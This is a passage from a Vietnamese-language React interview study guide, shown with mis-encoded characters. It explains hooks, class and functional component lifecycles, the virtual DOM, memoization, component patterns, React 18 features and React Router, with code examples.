    store.subscribe.bind(store),  // subscribe function
    store.getSnapshot.bind(store) // getSnapshot function
  );
  
  return (
    <div>
      <p>Count: {state.count}</p>
      <button onClick={() => store.increment()}>Increment</button>
    </div>
  );
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// BROWSER APIs (window.online)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function useOnlineStatus() {
  return useSyncExternalStore(
    (callback) => {
      window.addEventListener('online', callback);
      window.addEventListener('offline', callback);
      return () => {
        window.removeEventListener('online', callback);
        window.removeEventListener('offline', callback);
      };
    },
    () => navigator.onLine, // getSnapshot
    () => true // getServerSnapshot (SSR)
  );
}

function StatusBar() {
  const isOnline = useOnlineStatus();
  return <div>{isOnline ? 'ğŸŸ¢ Online' : 'ğŸ”´ Offline'}</div>;
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// WINDOW SIZE
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function useWindowSize() {
  return useSyncExternalStore(
    (callback) => {
      window.addEventListener('resize', callback);
      return () => window.removeEventListener('resize', callback);
    },
    () => ({ width: window.innerWidth, height: window.innerHeight }),
    () => ({ width: 0, height: 0 }) // SSR fallback
  );
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ZUSTAND STORE (Example)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const useStore = create((set) => ({
  count: 0,
  increment: () => set((state) => ({ count: state.count + 1 }))
}));

// Zustand internally uses useSyncExternalStore (React 18+)
function Counter() {
  const count = useStore(state => state.count);
  const increment = useStore(state => state.increment);
  
  return <button onClick={increment}>{count}</button>;
}
```

**ğŸ’¡ Note:**
- Háº§u háº¿t developers KHÃ”NG cáº§n dÃ¹ng trá»±c tiáº¿p
- Libraries (Redux, Zustand, Jotai) Ä‘Ã£ integrate internally
- Chá»‰ cáº§n khi build custom state management library

---

#### **ğŸ“š PHáº¦N 2: LIFECYCLE - CLASS VS FUNCTIONAL COMPONENTS**

---

##### **2.1. Class Component Lifecycle**

```typescript
class MyComponent extends React.Component {
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // MOUNTING PHASE (Component Ä‘Æ°á»£c táº¡o vÃ  thÃªm vÃ o DOM)
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  
  constructor(props) {
    super(props);
    // 1. Khá»Ÿi táº¡o state
    this.state = { count: 0 };
    // 2. Bind methods
    this.handleClick = this.handleClick.bind(this);
    // âš ï¸ KHÃ”NG gá»i setState() á»Ÿ Ä‘Ã¢y!
    // âš ï¸ KHÃ”NG cÃ³ side effects (API calls, subscriptions)
  }
  
  static getDerivedStateFromProps(props, state) {
    // 2. Sync state vá»›i props (HIáº¾M khi dÃ¹ng)
    // Cháº¡y TRÆ¯á»šC má»—i render (mount + update)
    // Must return object to update state, or null
    if (props.value !== state.value) {
      return { value: props.value };
    }
    return null;
  }
  
  componentDidMount() {
    // 3. Component Ä‘Ã£ mount vÃ o DOM
    // âœ… PERFECT cho:
    // - API calls / Data fetching
    // - Subscriptions (WebSocket, EventEmitter)
    // - DOM manipulation
    // - Setup timers/intervals
    
    // Example:
    fetch('/api/data')
      .then(res => res.json())
      .then(data => this.setState({ data }));
    
    this.timer = setInterval(() => {
      this.setState({ time: new Date() });
    }, 1000);
    
    document.addEventListener('click', this.handleClick);
  }
  
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // UPDATING PHASE (Props hoáº·c State thay Ä‘á»•i)
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  
  shouldComponentUpdate(nextProps, nextState) {
    // 4. Quyáº¿t Ä‘á»‹nh cÃ³ render láº¡i khÃ´ng (performance optimization)
    // Return false â†’ skip render
    // âš ï¸ PureComponent tá»± Ä‘á»™ng implement shallow comparison
    
    return nextProps.id !== this.props.id || 
           nextState.count !== this.state.count;
  }
  
  getSnapshotBeforeUpdate(prevProps, prevState) {
    // 5. Capture DOM info TRÆ¯á»šC khi update (HIáº¾M dÃ¹ng)
    // Return value â†’ pass vÃ o componentDidUpdate
    
    // Example: Preserve scroll position
    if (prevProps.list.length < this.props.list.length) {
      return this.listRef.scrollHeight;
    }
    return null;
  }
  
  componentDidUpdate(prevProps, prevState, snapshot) {
    // 6. Component Ä‘Ã£ re-render
    // âœ… PERFECT cho:
    // - Fetch data khi props thay Ä‘á»•i
    // - DOM manipulation based on changes
    // - Update third-party libraries
    
    // âš ï¸ MUST so sÃ¡nh props/state trÆ°á»›c khi setState (trÃ¡nh infinite loop!)
    if (this.props.userId !== prevProps.userId) {
      this.fetchUser(this.props.userId);
    }
    
    // Use snapshot from getSnapshotBeforeUpdate
    if (snapshot !== null) {
      this.listRef.scrollTop = 
        this.listRef.scrollHeight - snapshot;
    }
  }
  
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // UNMOUNTING PHASE (Component bá»‹ remove khá»i DOM)
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  
  componentWillUnmount() {
    // 7. Cleanup trÆ°á»›c khi unmount
    // âœ… REQUIRED Ä‘á»ƒ trÃ¡nh memory leaks:
    // - Clear timers/intervals
    // - Cancel network requests
    // - Unsubscribe
    // - Remove event listeners
    
    clearInterval(this.timer);
    document.removeEventListener('click', this.handleClick);
    this.subscription.unsubscribe();
  }
  
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // ERROR HANDLING
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  
  static getDerivedStateFromError(error) {
    // 8. Update state khi cÃ³ error
    return { hasError: true };
  }
  
  componentDidCatch(error, errorInfo) {
    // 9. Log error info
    logErrorToService(error, errorInfo);
  }
  
  render() {
    // 10. Return JSX (MUST be pure function)
    // âš ï¸ KHÃ”NG setState, side effects á»Ÿ Ä‘Ã¢y!
    return <div>{this.state.count}</div>;
  }
}
```

**ğŸ“Š Lifecycle Diagram:**

```
MOUNTING:
constructor â†’ getDerivedStateFromProps â†’ render â†’ componentDidMount

UPDATING (props/state change):
getDerivedStateFromProps â†’ shouldComponentUpdate â†’ render â†’ 
getSnapshotBeforeUpdate â†’ componentDidUpdate

UNMOUNTING:
componentWillUnmount

ERROR:
getDerivedStateFromError â†’ componentDidCatch
```

---

##### **2.2. Functional Component Lifecycle (vá»›i Hooks)**

```typescript
function MyComponent(props) {
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // EQUIVALENT TO: constructor
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  const [count, setCount] = useState(0);
  const [data, setData] = useState(null);
  
  // Lazy initialization (nhÆ° constructor logic)
  const [expensiveState, setExpensiveState] = useState(() => {
    return computeExpensiveValue();
  });
  
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // EQUIVALENT TO: getDerivedStateFromProps
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // âŒ KhÃ´ng cáº§n! Chá»‰ compute trong render
  const derivedValue = props.value * 2;
  
  // Hoáº·c náº¿u cáº§n sync vá»›i state:
  const [value, setValue] = useState(props.initialValue);
  useEffect(() => {
    setValue(props.initialValue);
  }, [props.initialValue]);
  
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // EQUIVALENT TO: componentDidMount
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  useEffect(() => {
    // Cháº¡y SAU first render
    console.log('Mounted');
    
    fetch('/api/data')
      .then(res => res.json())
      .then(setData);
    
    const timer = setInterval(() => {}, 1000);
    
    document.addEventListener('click', handleClick);
    
    // EQUIVALENT TO: componentWillUnmount
    return () => {
      console.log('Unmounted');
      clearInterval(timer);
      document.removeEventListener('click', handleClick);
    };
  }, []); // Empty deps = chá»‰ cháº¡y khi mount/unmount
  
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // EQUIVALENT TO: componentDidUpdate (specific value)
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  useEffect(() => {
    // Cháº¡y khi userId thay Ä‘á»•i
    console.log('userId changed:', props.userId);
    fetchUser(props.userId);
  }, [props.userId]); // Dependency: userId
  
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // EQUIVALENT TO: componentDidUpdate (every render)
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  useEffect(() => {
    // Cháº¡y SAU má»—i render
    console.log('Component updated');
  }); // No deps = cháº¡y má»—i render
  
  // Track previous value (like prevProps/prevState)
  const prevCount = usePrevious(count);
  useEffect(() => {
    if (prevCount !== count) {
      console.log(`Count changed from ${prevCount} to ${count}`);
    }
  }, [count, prevCount]);
  
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // EQUIVALENT TO: shouldComponentUpdate
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // DÃ¹ng React.memo thay vÃ¬ hook
  // (xem pháº§n React.memo bÃªn dÆ°á»›i)
  
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // EQUIVALENT TO: getSnapshotBeforeUpdate
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // DÃ¹ng useLayoutEffect (cháº¡y TRÆ¯á»šC browser paint)
  useLayoutEffect(() => {
    const snapshot = listRef.current.scrollHeight;
    // Update DOM synchronously
  }, [list]);
  
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // RENDER
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  return <div>{count}</div>;
}

// Wrap vá»›i React.memo cho shouldComponentUpdate behavior
export default React.memo(MyComponent, (prevProps, nextProps) => {
  // Return true = skip re-render
  return prevProps.id === nextProps.id;
});
```

**ğŸ“Š So sÃ¡nh Class vs Functional:**

| Class Component | Functional Component |
|----------------|---------------------|
| `constructor` | `useState(() => initialValue)` |
| `componentDidMount` | `useEffect(() => {}, [])` |
| `componentDidUpdate` | `useEffect(() => {}, [deps])` |
| `componentWillUnmount` | `useEffect(() => { return cleanup }, [])` |
| `shouldComponentUpdate` | `React.memo(Component, areEqual)` |
| `getDerivedStateFromProps` | Compute trong render hoáº·c `useEffect` |
| `getSnapshotBeforeUpdate` | `useLayoutEffect` |
| `componentDidCatch` | ChÆ°a cÃ³ hook (dÃ¹ng Error Boundary class) |

---

#### **ğŸ“š PHáº¦N 3: VIRTUAL DOM & PERFORMANCE**

---

##### **3.1. Virtual DOM & Reconciliation**

**ğŸ¯ Virtual DOM lÃ  gÃ¬:**
- JavaScript object Ä‘áº¡i diá»‡n cho Real DOM
- React táº¡o Virtual DOM tree má»—i khi state/props thay Ä‘á»•i
- So sÃ¡nh (diffing) old Virtual DOM vs new Virtual DOM
- Chá»‰ update nhá»¯ng thay Ä‘á»•i thá»±c sá»± lÃªn Real DOM

**ğŸ“– Reconciliation Process:**

```typescript
// 1. Initial render
const vdom = { type: 'div', props: { className: 'box' }, children: ['Hello'] };
// â†’ React táº¡o real DOM: <div class="box">Hello</div>

// 2. State changes
setState({ text: 'World' });

// 3. New Virtual DOM
const newVdom = { type: 'div', props: { className: 'box' }, children: ['World'] };

// 4. Diffing algorithm
// - Same type (div) â†’ keep element, update children
// - Different type â†’ destroy & re-create
// - Update: only text node changes

// 5. Commit phase: Update real DOM
element.textContent = 'World'; // Chá»‰ update text, khÃ´ng re-create div
```

**ğŸ’¡ Key trong Lists - Táº I SAO QUAN TRá»ŒNG:**

```typescript
// âŒ KHÃ”NG DÃ™NG INDEX lÃ m key
{items.map((item, index) => <Item key={index} data={item} />)}
// Problem: Khi thÃªm/xÃ³a item â†’ index thay Ä‘á»•i â†’ React re-render sai items

// Example: [A, B, C] â†’ XÃ³a A â†’ [B, C]
// React nghÄ©: B cÃ³ key=0 â†’ giá»¯ nguyÃªn (SAI! B giá» cÃ³ key=1)
//            C cÃ³ key=1 â†’ giá»¯ nguyÃªn (SAI! C giá» cÃ³ key=0)
// â†’ Input values, scroll position, animations Bá»Š LOáº N

// âœ… DÃ™NG STABLE UNIQUE ID
{items.map(item => <Item key={item.id} data={item} />)}
// React biáº¿t chÃ­nh xÃ¡c item nÃ o added/removed/moved
```

**âš ï¸ Khi nÃ o Ä‘Æ°á»£c dÃ¹ng index:**
- List KHÃ”NG bao giá» thay Ä‘á»•i order (static)
- KhÃ´ng cÃ³ filter/sort
- Items khÃ´ng cÃ³ unique ID

---

##### **3.2. PureComponent vs React.memo**

**ğŸ¯ PureComponent (Class):**

```typescript
// Shallow comparison cá»§a props & state
class MyComponent extends React.PureComponent {
  render() {
    return <div>{this.props.name}</div>;
  }
}

// Equivalent to:
class MyComponent extends React.Component {
  shouldComponentUpdate(nextProps, nextState) {
    return !shallowEqual(this.props, nextProps) || 
           !shallowEqual(this.state, nextState);
  }
}

// âš ï¸ Chá»‰ shallow comparison:
// { a: 1 } !== { a: 1 } â†’ re-render (máº·c dÃ¹ giá»‘ng nhau)
// [1,2,3] !== [1,2,3] â†’ re-render
```

**ğŸ¯ React.memo (Functional):**

```typescript
// Default: Shallow comparison cá»§a props
const MyComponent = React.memo(({ name, age }) => {
  return <div>{name} - {age}</div>;
});

// Custom comparison
const MyComponent = React.memo(
  ({ user }) => <div>{user.name}</div>,
  (prevProps, nextProps) => {
    return prevProps.user.id === nextProps.user.id; // true = skip render
  }
);

// Combine vá»›i useMemo/useCallback
function Parent() {
  const [count, setCount] = useState(0);
  const [name, setName] = useState('');
  
  // âœ… Stable reference
  const config = useMemo(() => ({ theme: 'dark' }), []);
  const handleClick = useCallback(() => {}, []);
  
  return (
    <>
      <input value={name} onChange={e => setName(e.target.value)} />
      <Child config={config} onClick={handleClick} /> {/* KhÃ´ng re-render */}
    </>
  );
}

const Child = React.memo(({ config, onClick }) => {
  console.log('Child rendered');
  return <button onClick={onClick}>{config.theme}</button>;
});
```

---

##### **3.3. state vs props & Parent/Child Re-rendering**

**ğŸ“– state vs props:**

```typescript
// STATE: Owned by component, mutable (via setState)
const [count, setCount] = useState(0); // Component controls this

// PROPS: Passed from parent, READ-ONLY
function Child({ count }) { // Cannot modify count
  // count = 10; // âŒ Error!
  return <div>{count}</div>;
}

// Data flow: Parent state â†’ Child props (one-way)
function Parent() {
  const [count, setCount] = useState(0);
  return <Child count={count} />; // Pass state as props
}
```

**ğŸ“– Parent re-render â†’ Child re-render?**

```typescript
// âœ… YES: Default behavior
function Parent() {
  const [count, setCount] = useState(0);
  return (
    <>
      <button onClick={() => setCount(count + 1)}>Increment</button>
      <Child /> {/* Re-render ngay cáº£ khi khÃ´ng cÃ³ props! */}
    </>
  );
}

// ğŸ”§ Optimization 1: React.memo
const Child = React.memo(() => {
  console.log('Child rendered');
  return <div>Child</div>;
}); // KhÃ´ng re-render náº¿u props khÃ´ng Ä‘á»•i

// ğŸ”§ Optimization 2: children prop
function Parent() {
  const [count, setCount] = useState(0);
  return (
    <Layout>
      <Child /> {/* KhÃ´ng re-render! */}
    </Layout>
  );
}

function Layout({ children }) {
  const [theme, setTheme] = useState('light');
  return <div className={theme}>{children}</div>;
  // children lÃ  stable reference â†’ khÃ´ng re-create
}

// ğŸ”§ Optimization 3: Component composition
function Parent() {
  const child = useMemo(() => <Child />, []); // Cache element
  return <div>{child}</div>;
}
```

---

#### **ğŸ“š PHáº¦N 4: ADVANCED PATTERNS**

---

##### **4.1. Higher-Order Components (HOC)**

```typescript
// HOC = Function nháº­n component, return enhanced component
function withLoading(Component) {
  return function WithLoadingComponent({ isLoading, ...props }) {
    if (isLoading) return <div>Loading...</div>;
    return <Component {...props} />;
  };
}

// Usage
const UserListWithLoading = withLoading(UserList);
<UserListWithLoading isLoading={true} users={[]} />

// HOC for authentication
function withAuth(Component) {
  return function AuthComponent(props) {
    const { user } = useAuth();
    if (!user) return <Navigate to="/login" />;
    return <Component {...props} user={user} />;
  };
}
```

---

##### **4.2. Render Props**

```typescript
// Component vá»›i function as child
function DataFetcher({ url, render }) {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  
  useEffect(() => {
    fetch(url).then(res => res.json()).then(data => {
      setData(data);
      setLoading(false);
    });
  }, [url]);
  
  return render({ data, loading });
}

// Usage
<DataFetcher 
  url="/api/users"
  render={({ data, loading }) => (
    loading ? <Spinner /> : <UserList users={data} />
  )}
/>

// Modern alternative: Custom hooks
function useDataFetch(url) {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  useEffect(() => { /* fetch logic */ }, [url]);
  return { data, loading };
}

function UserList() {
  const { data, loading } = useDataFetch('/api/users');
  if (loading) return <Spinner />;
  return <ul>{data.map(user => <li key={user.id}>{user.name}</li>)}</ul>;
}
```

---

##### **4.3. Compound Components**

```typescript
// Components hoáº¡t Ä‘á»™ng cÃ¹ng nhau qua Context
const TabsContext = createContext();

function Tabs({ children, defaultTab }) {
  const [activeTab, setActiveTab] = useState(defaultTab);
  return (
    <TabsContext.Provider value={{ activeTab, setActiveTab }}>
      {children}
    </TabsContext.Provider>
  );
}

function TabList({ children }) {
  return <div className="tab-list">{children}</div>;
}

function Tab({ id, children }) {
  const { activeTab, setActiveTab } = useContext(TabsContext);
  return (
    <button 
      className={activeTab === id ? 'active' : ''}
      onClick={() => setActiveTab(id)}
    >
      {children}
    </button>
  );
}

function TabPanel({ id, children }) {
  const { activeTab } = useContext(TabsContext);
  return activeTab === id ? <div>{children}</div> : null;
}

// Usage (flexible API)
<Tabs defaultTab="home">
  <TabList>
    <Tab id="home">Home</Tab>
    <Tab id="profile">Profile</Tab>
  </TabList>
  <TabPanel id="home">Home content</TabPanel>
  <TabPanel id="profile">Profile content</TabPanel>
</Tabs>
```

---

#### **ğŸ“š PHáº¦N 5: REACT FEATURES**

---

##### **5.1. React Batching (Automatic in React 18+)**

```typescript
// React 17: Chá»‰ batch trong event handlers
function handleClick() {
  setCount(c => c + 1);
  setFlag(f => !f);
  // â†’ 1 re-render (batched)
}

setTimeout(() => {
  setCount(c => c + 1);
  setFlag(f => !f);
  // â†’ 2 re-renders (KHÃ”NG batch)
}, 1000);

// React 18: Automatic batching má»i nÆ¡i
setTimeout(() => {
  setCount(c => c + 1);
  setFlag(f => !f);
  // â†’ 1 re-render (batched tá»± Ä‘á»™ng)
}, 1000);

// Opt-out batching
import { flushSync } from 'react-dom';

flushSync(() => {
  setCount(c => c + 1);
}); // Render immediately
setFlag(f => !f); // Render again
```

---

##### **5.2. Code Splitting & Lazy Loading**

```typescript
// Route-based splitting
const Home = lazy(() => import('./Home'));
const About = lazy(() => import('./About'));

function App() {
  return (
    <Suspense fallback={<Spinner />}>
      <Routes>
        <Route path="/" element={<Home />} />
        <Route path="/about" element={<About />} />
      </Routes>
    </Suspense>
  );
}

// Component-based splitting
const HeavyChart = lazy(() => import('./HeavyChart'));

function Dashboard() {
  const [showChart, setShowChart] = useState(false);
  return (
    <>
      <button onClick={() => setShowChart(true)}>Show Chart</button>
      {showChart && (
        <Suspense fallback={<div>Loading chart...</div>}>
          <HeavyChart />
        </Suspense>
      )}
    </>
  );
}

// Named exports
const { TabPanel } = lazy(() => 
  import('./Tabs').then(module => ({ default: module.TabPanel }))
);
```

---

##### **5.3. React Portal**

```typescript
// Render children vÃ o DOM node khÃ¡c (ngoÃ i parent hierarchy)
function Modal({ children, isOpen }) {
  if (!isOpen) return null;
  
  return createPortal(
    <div className="modal-overlay">
      <div className="modal">{children}</div>
    </div>,
    document.getElementById('modal-root') // Target container
  );
}

// index.html
<body>
  <div id="root"></div>
  <div id="modal-root"></div> <!-- Portal target -->
</body>

// Use cases:
// - Modals, Dialogs
// - Tooltips, Popovers
// - Notifications (toast)
```

---

##### **5.4. Error Boundaries**

```typescript
// Chá»‰ cÃ³ thá»ƒ dÃ¹ng Class Component (chÆ°a cÃ³ hook)
class ErrorBoundary extends React.Component {
  state = { hasError: false, error: null };
  
  static getDerivedStateFromError(error) {
    return { hasError: true, error };
  }
  
  componentDidCatch(error, errorInfo) {
    logErrorToService(error, errorInfo);
  }
  
  render() {
    if (this.state.hasError) {
      return <ErrorFallback error={this.state.error} />;
    }
    return this.props.children;
  }
}

// Usage
<ErrorBoundary>
  <App />
</ErrorBoundary>

// âš ï¸ Error boundaries KHÃ”NG catch:
// - Event handlers (dÃ¹ng try/catch)
// - Async code (setTimeout, promises)
// - Server-side rendering
// - Errors trong Error Boundary itself
```

---

#### **ğŸ“š PHáº¦N 6: REACT 18+ FEATURES**

---

##### **6.1. Suspense for Data Fetching**

```typescript
// Suspense-enabled data fetching
const resource = fetchData('/api/users'); // Returns special object

function UserList() {
  const users = resource.read(); // Suspends if not ready
  return <ul>{users.map(u => <li key={u.id}>{u.name}</li>)}</ul>;
}

function App() {
  return (
    <Suspense fallback={<Spinner />}>
      <UserList /> {/* Suspends while loading */}
    </Suspense>
  );
}

// Libraries há»— trá»£: React Query, SWR, Relay
```

---

##### **6.2. Server Components (React 18+)**

```typescript
// Server Component (.server.jsx)
async function UserProfile({ userId }) {
  const user = await db.users.findById(userId); // Direct DB access!
  return <div>{user.name}</div>;
}

// Client Component (.client.jsx)
'use client';
function Counter() {
  const [count, setCount] = useState(0);
  return <button onClick={() => setCount(count + 1)}>{count}</button>;
}

// Benefits:
// - Zero bundle size (server components khÃ´ng ship JS)
// - Direct backend access (DB, filesystem)
// - Automatic code splitting
```

---

##### **6.3. Concurrent Rendering - useTransition & useDeferredValue**

```typescript
// useTransition: Mark updates as non-urgent
function SearchBox() {
  const [query, setQuery] = useState('');
  const [isPending, startTransition] = useTransition();
  
  const handleChange = (e) => {
    setQuery(e.target.value); // Urgent: update input
    
    startTransition(() => {
      setSearchResults(e.target.value); // Non-urgent: can interrupt
    });
  };
  
  return (
    <>
      <input value={query} onChange={handleChange} />
      {isPending && <Spinner />}
      <Results />
    </>
  );
}

// useDeferredValue: Defer value updates
function App() {
  const [text, setText] = useState('');
  const deferredText = useDeferredValue(text); // Lags behind
  
  return (
    <>
      <input value={text} onChange={e => setText(e.target.value)} />
      <SlowList text={deferredText} /> {/* Uses old value while busy */}
    </>
  );
}
```

---

##### **6.4. Hydration (SSR/Next.js)**

```typescript
// Server-side: Generate HTML
const html = renderToString(<App />);
// Send HTML to client â†’ User sees content immediately

// Client-side: Hydrate (attach event listeners)
hydrateRoot(document.getElementById('root'), <App />);

// React 18: Selective Hydration
<Suspense fallback={<Spinner />}>
  <Comments /> {/* Hydrate sau khi ready */}
</Suspense>
// User cÃ³ thá»ƒ interact vá»›i page khÃ¡c ngay láº­p tá»©c
```

---

#### **ğŸ“š PHáº¦N 7: ROUTING & MISC**

---

##### **7.1. React Router**

```typescript
import { BrowserRouter, Routes, Route, Link, useParams, useNavigate } from 'react-router-dom';

function App() {
  return (
    <BrowserRouter>
      <nav>
        <Link to="/">Home</Link>
        <Link to="/about">About</Link>
        <Link to="/users/123">User 123</Link>
      </nav>
      
      <Routes>
        <Route path="/" element={<Home />} />
        <Route path="/about" element={<About />} />
        <Route path="/users/:id" element={<User />} />
        <Route path="*" element={<NotFound />} /> {/* 404 */}
      </Routes>
    </BrowserRouter>
  );
}

function User() {
  const { id } = useParams(); // Get URL params
  const navigate = useNavigate(); // Programmatic navigation
  
  return (
    <>
      <h1>User {id}</h1>
      <button onClick={() => navigate('/about')}>Go to About</button>
    </>
  );
}
```

---

##### **7.2. Fragments**

```typescript
// Avoid extra DOM nodes
function List() {
  return (
    <>
      <li>Item 1</li>
      <li>Item 2</li>
    </> // No wrapper div in DOM
  );
}

// With key (trong loops)
{items.map(item => (
  <React.Fragment key={item.id}>
    <dt>{item.term}</dt>
    <dd>{item.description}</dd>
  </React.Fragment>
))}
```

---

##### **7.3. startTransition (React 18)**

```typescript
import { startTransition } from 'react';

// Mark state updates as non-urgent
function TabContainer() {
  const [tab, setTab] = useState('home');
  
  function selectTab(nextTab) {
    startTransition(() => {
      setTab(nextTab); // Low priority
    });
  }
  
  // Input stays responsive even if TabPanel render is slow
}
```

---

##### **7.4. React.lazy & Suspense Integration**

```typescript
const OtherComponent = lazy(() => import('./OtherComponent'));

function MyComponent() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <OtherComponent />
    </Suspense>
  );
}

// Multiple lazy components
<Suspense fallback={<Spinner />}>
  <ComponentA />
  <ComponentB />
</Suspense>
// Waits for BOTH before showing (avoid cascading spinners)
```

---

#### **ğŸ¯ TÃ“M Táº®T Q39 - REACT COMPREHENSIVE**

**âœ… ÄÃ£ cover:**
1. **All Hooks**: useState, useEffect, useRef, useLayoutEffect, useReducer, useContext, useMemo, useCallback, useImperativeHandle, useSyncExternalStore
2. **Lifecycle**: Class component lifecycle Ä‘áº§y Ä‘á»§ + mapping sang Functional
